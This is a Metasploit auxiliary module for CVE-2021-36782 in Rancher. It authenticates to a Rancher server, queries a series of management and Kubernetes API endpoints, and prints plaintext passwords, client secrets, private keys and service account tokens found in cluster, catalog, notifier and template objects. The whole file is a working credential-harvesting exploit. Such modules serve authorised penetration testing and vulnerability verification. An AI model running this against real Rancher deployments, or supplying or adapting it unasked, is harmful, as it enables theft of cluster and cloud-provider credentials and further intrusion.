##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rancher Authenticated API Credential Exposure',
        'Description' => %q{
          An issue was discovered in Rancher versions up to and including
          2.5.15 and 2.6.6 where sensitive fields, like passwords, API keys
          and Ranchers service account token (used to provision clusters),
          were stored in plaintext directly on Kubernetes objects like Clusters,
          for example cluster.management.cattle.io. Anyone with read access to
          those objects in the Kubernetes API could retrieve the plaintext
          version of those sensitive data.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Florian Struck', # discovery
          'Marco Stuurman' # discovery
        ],
        'References' => [
          [ 'URL', 'https://github.com/advisories/GHSA-g7j7-h4q8-8w2f'],
          [ 'URL', 'https://github.com/fe-ax/tf-cve-2021-36782'],
          [ 'URL', 'https://fe.ax/cve-2021-36782/'],
          [ 'CVE', '2021-36782']
        ],
        'DisclosureDate' => '2022-08-18',
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_options(
      [
        OptString.new('USERNAME', [ true, 'User to login with']),
        OptString.new('PASSWORD', [ true, 'Password to login with']),
        OptString.new('TARGETURI', [ true, 'The URI of Rancher instance', '/'])
      ]
    )
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def rancher?
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'dashboard/'),
      'keep_cookies' => true
    })
    return false unless res&.code == 200

    html = res.get_html_document
    title = html.at('title').text
    title == 'dashboard' # this is a VERY weak check
  end

  def login
    # get our cookie first with CSRF token
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'v1', 'management.cattle.io.setting'),
      'keep_cookies' => true
    })
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") unless res.code == 200

    json_post_data = JSON.pretty_generate(
      {
        'description' => 'UI session',
        'responseType' => 'cookie',
        'username' => username,
        'password' => password
      }
    )
    fail_with(Failure::UnexpectedReply, "#{peer} - CSRF token not found in cookie") unless res.get_cookies.to_s =~ /CSRF=(\w*);/

    csrf = ::Regexp.last_match(1)

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'v3-public', 'localProviders', 'local'),
      'keep_cookies' => true,
      'method' => 'POST',
      'vars_get' => {
        'action' => 'login'
      },
      'headers' => {
        'accept' => 'application/json',
        'X-Api-Csrf' => csrf
      },
      'ctype' => 'application/json',
      'data' => json_post_data
    )
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::NoAccess, "#{peer} - Login failed, check credentials") if res.code == 401
  end

  def check
    return Exploit::CheckCode::Unknown("#{peer} - Could not connect to web service, or does not seem to be a rancher website") unless rancher?

    Exploit::CheckCode::Detected('Seems to be rancher, but unable to determine version')
  end

  def run
    vprint_status('Attempting login')
    login
    vprint_good('Login successful, querying APIs')
    [
      '/v1/management.cattle.io.catalogs',
      '/v1/management.cattle.io.clusters',
      '/v1/management.cattle.io.clustertemplates',
      '/v1/management.cattle.io.notifiers',
      '/v1/project.cattle.io.sourcecodeproviderconfig',
      '/k8s/clusters/local/apis/management.cattle.io/v3/catalogs',
      '/k8s/clusters/local/apis/management.cattle.io/v3/clusters',
      '/k8s/clusters/local/apis/management.cattle.io/v3/clustertemplates',
      '/k8s/clusters/local/apis/management.cattle.io/v3/notifiers',
      '/k8s/clusters/local/apis/project.cattle.io/v3/sourcecodeproviderconfigs'
    ].each do |api_endpoint|
      vprint_status("Querying #{api_endpoint}")
      res = send_request_cgi(
        'uri' => normalize_uri(target_uri.path, api_endpoint),
        'headers' => {
          'accept' => 'application/json'
        }
      )
      if res.nil?
        vprint_error("No response received from #{api_endpoint}")
        next
      end
      next unless res.code == 200

      json_body = res.get_json_document
      next unless json_body.key? 'data'

      json_body['data'].each do |data|
        # list taken directly from CVE writeup, however this isn't how the API presents its so we fix it later
        [
          'Notifier.SMTPConfig.Password',
          'Notifier.WechatConfig.Secret',
          'Notifier.DingtalkConfig.Secret',
          'Catalog.Spec.Password',
          'SourceCodeProviderConfig.GithubPipelineConfig.ClientSecret',
          'SourceCodeProviderConfig.GitlabPipelineConfig.ClientSecret',
          'SourceCodeProviderConfig.BitbucketCloudPipelineConfig.ClientSecret',
          'SourceCodeProviderConfig.BitbucketServerPipelineConfig.PrivateKey',
          'Cluster.Spec.RancherKubernetesEngineConfig.BackupConfig.S3BackupConfig.SecretKey',
          'Cluster.Spec.RancherKubernetesEngineConfig.PrivateRegistries.Password',
          'Cluster.Spec.RancherKubernetesEngineConfig.Network.WeaveNetworkProvider.Password',
          'Cluster.Spec.RancherKubernetesEngineConfig.CloudProvider.VsphereCloudProvider.Global.Password',
          'Cluster.Spec.RancherKubernetesEngineConfig.CloudProvider.VsphereCloudProvider.VirtualCenter.Password',
          'Cluster.Spec.RancherKubernetesEngineConfig.CloudProvider.OpenstackCloudProvider.Global.Password',
          'Cluster.Spec.RancherKubernetesEngineConfig.CloudProvider.AzureCloudProvider.AADClientSecret',
          'Cluster.Spec.RancherKubernetesEngineConfig.CloudProvider.AzureCloudProvider.AADClientCertPassword',
          'Cluster.Status.ServiceAccountToken',
          'ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.PrivateRegistries.Password',
          'ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.Network.WeaveNetworkProvider.Password',
          'ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.CloudProvider.VsphereCloudProvider.Global.Password',
          'ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.CloudProvider.VsphereCloudProvider.VirtualCenter.Password',
          'ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.CloudProvider.OpenstackCloudProvider.Global.Password',
          'ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.CloudProvider.AzureCloudProvider.AADClientSecret',
          'ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.CloudProvider.AzureCloudProvider.AADClientCertPassword'
        ].each do |leaky_key|
          leaky_key_fixed = leaky_key.split('.')[1..] # remove first item,
          leaky_key_fixed = leaky_key_fixed.map { |item| item[0].downcase + item[1..] } # downcase first letter in each word
          print_good("Found leaked key #{leaky_key}: #{data.dig(*leaky_key_fixed)}") if data.dig(*leaky_key_fixed)
        end
      end
    end
  end
end
